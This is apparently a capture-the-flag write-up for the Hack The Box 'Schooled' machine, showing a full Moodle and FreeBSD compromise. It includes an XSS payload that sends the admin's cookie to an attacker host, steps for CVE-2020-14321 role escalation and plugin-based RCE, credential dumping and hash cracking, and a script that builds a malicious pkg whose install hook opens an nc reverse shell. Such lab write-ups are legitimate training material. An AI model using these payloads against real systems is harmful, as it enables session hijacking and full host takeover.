---
published: true
---


<img src="https://i.ibb.co/j3QZnXc/Schooled.png" alt="Schooled" border="0">

<h2>Summary :</h2>

<li>1 - Stealing admin's cookie with XSS</li>
<li>2 - Privilege escalation using a CVE</li>
<li>3 - Getting RCE </li>
<li>4 - Database Enumeration</li>
<li>5 - Password cracking</li>
<li>6 - Creating malicious pkg</li>

					
<h2>Scanning phase :</h2> 

```
Not shown: 998 closed ports  
 PORT  STATE SERVICE VERSION  
 22/tcp open ssh   OpenSSH 7.9 (FreeBSD 20200214; protocol 2.0)  
 | ssh-hostkey:   
 |  2048 1d:69:83:78:fc:91:f8:19:c8:75:a7:1e:76:45:05:dc (RSA)  
 |  256 e9:b2:d2:23:9d:cf:0e:63:e0:6d:b9:b1:a6:86:93:38 (ECDSA)  
 |_ 256 7f:51:88:f7:3c:dd:77:5e:ba:25:4d:4c:09:25:ea:1f (ED25519)  
 80/tcp open http  Apache httpd 2.4.46 ((FreeBSD) PHP/7.4.15)  
 |_http-favicon: Unknown favicon MD5: 460AF0375ECB7C08C3AE0B6E0B82D717  
 | http-methods:   
 |  Supported Methods: GET POST OPTIONS HEAD TRACE  
 |_ Potentially risky methods: TRACE  
 |_http-server-header: Apache/2.4.46 (FreeBSD) PHP/7.4.15  
 |_http-title: Schooled - A new kind of educational institute  
 No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
```


We found two open ports (22 - 80).

So what should we do here ? 

1 - Searching for an exploit for the running services.<br>
2 - Check the website and see what we can find.

<h2>Enumeration : </h2>

<img src="https://i.ibb.co/27mV3Yj/web.png" alt="web" border="0">

I start checking the application and nothing works, i only found a contact list.

<img src="https://i.ibb.co/dpLJwkX/contact-list.png" alt="contact-list" border="0">

I saw admissions@schooled.htb i was suspicious so i tried to add it as a subdomain "admissions.schooled.htb" but it didn't work.

Now i will try see if there is another subdomain.

```
ffuf -w /opt/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -u http://schooled.htb/ -H 'Host: FUZZ.schooled.htb'  
     /'___\ /'___\      /'___\      
     /\ \__/ /\ \__/ __ __ /\ \__/      
     \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\     
     \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/     
      \ \_\  \ \_\ \ \____/ \ \_\      
      \/_/  \/_/  \/___/  \/_/      
     v1.2.0-git  
 ________________________________________________  
  :: Method      : GET  
  :: URL       : http://schooled.htb/  
  :: Wordlist     : FUZZ: /opt/SecLists/Discovery/DNS/subdomains-top1million-5000.txt  
  :: Header      : Host: FUZZ.schooled.htb  
  :: Follow redirects : false  
  :: Calibration   : false  
  :: Timeout     : 10  
  :: Threads     : 40  
  :: Matcher     : Response status: 200,204,301,302,307,401,403  
 ________________________________________________  
 moodle         [Status: 200, Size: 84, Words: 5, Lines: 2]  
```


<img src="https://c.tenor.com/6xIziN0-uq4AAAAC/boom.gif" alt="boom">

There is our subdomain !

<img src="https://i.ibb.co/12M1hfS/login.png" alt="login" border="0">

Now let's check if we can create an account.

<img src="https://i.ibb.co/4Rx7zrg/Creating-an-account.png" alt="Creating-an-account" border="0">

<img src="https://i.ibb.co/5vqHhYs/account.png" alt="account" border="0">

Creating an account should be in that formula name@student.schooled.htb

<img src="https://i.ibb.co/dDzXFCw/logged-in.png" alt="logged-in" border="0">

After some searching i found this <a href="https://github.com/HoangKien1020/CVE-2020-14321">CVE-2020-14321</a> that is the latest CVE for moodle so it should be for that box 😉

So if you read the CVE you should understood that i should have teacher role to use it.

After a while i found that the only course i can enrol is math course.

<img src="https://i.ibb.co/Gc5wMm9/Math.png" alt="Math" border="0">

I read the announcements and i found this.

<img src="https://i.ibb.co/10C0JM8/hint.png" alt="hint" border="0">

So the teacher interact with the user through moodleNet profile.

The first thing came into my head that i should use xss to steal his cookie, let's try it.

Payload : <img src=x onerror=this.src='http://10.10.x.x:8000/?'+document.cookie;>

<img src="https://i.ibb.co/vzp7m78/xss.png" alt="xss" border="0">

<img src="https://i.ibb.co/1fhZBYL/server.png" alt="server" border="0">

<img src="https://media3.giphy.com/media/l0HlFZ3c4NENSLQRi/200.gif" alt="wow">

<img src="https://i.ibb.co/xCMJcBR/session-hijacking1.png" alt="session-hijacking1" border="0">

Now we are manuel Phillips.

The next thing is enrolling a user, intercept the request, change the role to 1, and ID to our ID. This process will allow us to log in as the user we add. You must pick a user that has a manager role, which in our case is Lianne Carter.

Let's do it ! 

<img src="https://i.ibb.co/NYPwswm/intercept-id.png" alt="intercept-id" border="0">

Now look at the left panel.

<img src="https://i.ibb.co/7KLzTj7/administration.png" alt="administration" border="0">

We have site administration now. 

To get our RCE we have to install a custom plugin but we should edit our role to be able to install plugin.

Go to Users > Define Roles > Manager > Edit to edit our role, intercept the request and change it with the one on github.

<img src="https://i.ibb.co/FW9SZk0/change-role.png" alt="change-role" border="0">

Now we can install plugin.

<img src="https://i.ibb.co/st9NHxc/plugin.png" alt="plugin" border="0">

Just follow <a href="https://github.com/HoangKien1020/Moodle_RCE" >Moodle Rce</a> and trigger the rce at "domain/blocks/rce/lang/en/block_rce.php?cmd=id"

<img src="https://i.ibb.co/dmCmQcB/rce1.png" alt="rce1" border="0">


<h2>Foothold : </h2>

We got our shell !! 

<img src="https://i.ibb.co/swMrynH/shell.png" alt="shell" border="0">

After some enumeration i found database configuration file.

<img src="https://i.ibb.co/DYGB1rL/DB.png" alt="DB" border="0">

When i tried to use mysql the OS didn't find it, so i looked for it in /usr/local/bin and i found it, let's get the creds ! 

<img src="https://i.ibb.co/V2r0wfH/creds.png" alt="creds" border="0">

Now let's crack the hash.

<img src="https://i.ibb.co/ZGpsTWz/crack.png" alt="crack" border="0">

<h2>User Flag : </h2>

Jamies password = !QAZ2wsx

Let's grab our SSH.


<img src="https://i.ibb.co/tm4KHD3/sssh1.png" alt="sssh1" border="0">

Privilege escalation : 

After using sudo -l, we can install pkg with nopasswd.

<img src="https://i.ibb.co/ZWKgMRb/sudo.png" alt="sudo" border="0">

I found this refernce to create a pkg http://lastsummer.de/creating-custom-packages-on-freebsd/ 

Script for getting root :

```
 #!/bin/sh  
 STAGEDIR=/tmp/package  
 rm -rf ${STAGEDIR}  
 mkdir -p ${STAGEDIR}  
 cat >> ${STAGEDIR}/+PRE_INSTALL <<EOF  
 echo “Resetting root shell”  
 rm /tmp/a;mkfifo /tmp/a;cat /tmp/a|/bin/sh -i 2>&1|nc 10.10.x.x 9080 >/tmp/a  
 EOF  
 cat >> ${STAGEDIR}/+POST_INSTALL <<EOF  
 echo “Registering root shell”  
 pw usermod -n root -s /bin/sh  
 EOF  
 cat >> ${STAGEDIR}/+MANIFEST <<EOF  
 name: mypackage  
 version: “1.0_5”  
 origin: sysutils/mypackage  
 comment: “automates stuff”  
 desc: “automates tasks which can also be undone later”  
 maintainer: john@doe.it  
 www: https://doe.it  
 prefix: /  
 EOF  
 pkg create -m ${STAGEDIR}/ -r ${STAGEDIR}/ -o .  
```

This script will create .txz file.

<img src="https://i.ibb.co/qmNcZwz/txs.png" alt="txs" border="0">

<h2>Root flag : </h2>

1 - Setup a listner on your machine <br>
2 - use this command  "sudo pkg install --no-repo-update *.txz"

<img src="https://i.ibb.co/LpnvwFY/root.png" alt="root" border="0">

<img src="https://c.tenor.com/J4GjjwnXX8QAAAAd/scarface-tony-montana.gif" alt="montana">
